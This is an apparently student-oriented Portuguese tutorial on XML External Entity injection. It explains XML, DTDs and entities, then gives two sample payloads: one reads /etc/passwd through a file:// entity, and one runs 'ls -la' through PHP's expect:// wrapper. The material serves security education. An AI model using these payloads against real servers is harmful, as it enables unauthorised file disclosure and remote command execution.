# XML External Entities \(XML\) Injection

## O que é XXE Injection?

XXE \(XML external entity\) Injection é uma vulnerabilidade web que permite ao atacante se aproveitar do processamento de dados XMLs de uma aplicação de maneira maliciosa.

Dentre outros problemas, esse tipo de ataque pode levar o atacante à visualização de arquivos confidenciais e à interação com o backend da aplicação \(e, possivelmente, sistemas externos\), levando a possíveis SSRFs.

Mas antes de entender como funciona esse ataque, devemos entender o que é: XML, DTDs e entidades.

## Explicando brevemente XML

XML significa **Ex**tensible **M**arkup **L**anguage. Essa linguagem de marcação foi criada para armazenar e transportar dados, assim como o JSON. Por sinal, a popularidade do XML diminuiu devido ao JSON.

O XML utlizada _tags_ em uma estrutura de árvore, de forma similar ao HTML \(tags uma dentro da outra e dados entre o ínicio e o fim das tags\). Entretanto, o XML não tem _tags_ predefinidas, ou seja, a pessoa que está criando o XML pode definir suas próprias _tags_, como no exemplo abaixo:

```markup
<?xml version="1.0" encoding="UTF-8"?>
<msg lang="pt-br" category="web">
    <from> Ganeshers </from>
    <to> All </to>
    <title> Exemplo para os bixos </title>
    <body> Esse é um exemplo de XML bem simples! </body>
</msg>
```

Para saber um pouco mais sobre XML, pesquise em sites como a [w3schools](https://www.w3schools.com/xml/).

## DTD \(Document Type Definition\)

Como descrito acima, DTD significa "definição de tipo de documento" e ela contém declarações que definem a estrutura do XML, os tipos de dados que ele contém e mais. A DTD é opcional. Ela é declarada dentro de um elemento chamado `DOCTYPE` no começo do documento XML. Além disso, a DTD pode ser interna - declarada dentro do documento XML - ou externa - carregada de uma fonte externa.

Para exemplificar, uma XML com DTD segue esse padrão:

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doctype_name [ 
    <!ELEMENT elem1 (elem2, elem3)>
    <!ELEMENT elem2 (#PCDATA)>
    <!ELEMENT elem3 (#PCDATA)>
 ]>
 <elem1>
    <elem2> Dados do elem2, bom dia </elem2>
    <elem3> aaaa 1235125 pode haver qualquer coisa aqui </elem3>
</elem1>
```

\_Obs.: PCDATA significa "Parsed Character Data" e representa um tipo de dado qualquer \(não sei como explicar melhor, desculpa\).

## Entidades XML

As _XML entities_ são uma forma de representar itens do documento XML sem usar seus dados diretamente. Pode-se pensar que essas entidades seriam como variáveis em uma linguagem de programação.

Essas entidades podem ser das especificações/padrões do XML, como `&lt;` e `&gt;` \(que representam `<` e `>`\), ou podem ser costumizadas. As entidades customizadas são definidas dentro do DTD, como no exemplo a seguir.

```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE teste [ <!ENTITY texto_com_top "Top top" > ]>
<tag_generica> &lt;&texto_com_top;&gt; </tag_generica>
```

Nesse documento XML, `&texto_com_top;` seria substituido por`<Top top>`.

Com base nesse exemplo, nota-se que as entidades criadas devem ser referenciadas com `&` + `nome da entidade` + `;`.

### Entidades internas

Como no exemplo anterior, as entidades internas são definidas no próprio documento XML, dentro do DTD do qual elas fazem parte, ou seja, não é necessário que o servidor que está processando o XML busque algum dado fora do documento.

### Entidades externas

Já esse tipo de entidade é caracterizado por conter uma definição que está fora do documento XML, ou seja, o resposável por processar o XML com uma entidade externa deverá buscar a definição da entidade fora do DTD. Esse tipo de entidade vem com a palavra-chave `SYSTEM` para indicar que ela é externa. Após o `SYSTEM`, há uma URL indicando de onde o valor deve ser carregado.

A entidade externa pode refenciar tanto servidores e serviços externos quanto o próprio servidor interno \(usando o protocolo `file://`\).

```markup
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>

<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
```

## Voltando ao ataque

Agora que já foi explicado um pouco sobre XML, vamos entender um pouco sobre o ataque...

Esse tipo de Injection é possível em aplicações que usam XML para transmitir dados entre cliente \(navegador\) e servidor. O XML enviado para o servidor \(backend\) é "tratado" por um _parser_ \(normalmente de alguma API ou biblioteca já existente\) e muitas vezes esse tratamento é feito de forma indevida, permitindo que o dado enviado pelo cliente/atacante possa manipular o funcionamento do backend de forma maliciosa. Com exemplos, isso ficará mais claro...

### Exemplo 1: acessando arquivos do servidor

Como explicado anteriormente, as entidades externas presentes em documento XML podem buscar arquivos dentro do próprio servidor por meio do protocolo `file://`. Sendo assim, em certos casos no qual há vulnerabilidade no tratamento do XML, pode ser possível acessar arquivos como `/etc/passwd` por meio de um XXE Injection:

```markup
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ELEMENT root ANY>
    <!ENTITY xxe SYSTEM 'file:///etc/passwd'>
]>
<root> &xxe; </root>
```

Caso o servidor retornasse o que está em `<root>` para ser exibido em um documento HTML, receberíamos o conteúdo de `/etc/passwd`.

### Exemplo 2: Execução de código remoto com PHP

Com um pouco de sorte, é possível que o servidor tenho o módulo \(wrapper\) `expect` carregado \(por padrão ele não é\), o que possivelmente permitirá execução de código a partir de um payload como o a seguir.

```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo
    [<!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "expect://exec('ls -la')" >
]>
<creds>
  <user> &xxe; </user>
  <pass> 123 </pass>
</creds>
```

Além desse exemplos, há diversos outros possíveis ataques a partir dessa vulnerabilidade. Alguns links que podem ser interessantes para aprender um pouco mais sobre XXE Injection são:

* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)
* [https://owasp.org/www-community/vulnerabilities/XML\_External\_Entity\_\(XXE\)\_Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_%28XXE%29_Processing)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

